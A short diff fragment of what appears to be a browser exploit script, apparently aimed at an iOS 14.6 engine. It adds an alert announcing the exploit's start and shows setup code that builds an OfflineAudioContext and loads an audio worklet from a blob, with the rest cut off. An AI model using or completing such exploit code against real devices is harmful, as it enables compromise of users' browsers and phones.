@@ -37,6 +37,7 @@ async function pwnMe() {
 
 var keep = [];
 function kickstart146() {
+  alert("Exploit for 14.6 has started.");
   var context = new OfflineAudioContext(1, 128, 300000);
   context.audioWorklet.addModule(URL.createObjectURL(new Blob([`
     // constant added to double JSValues
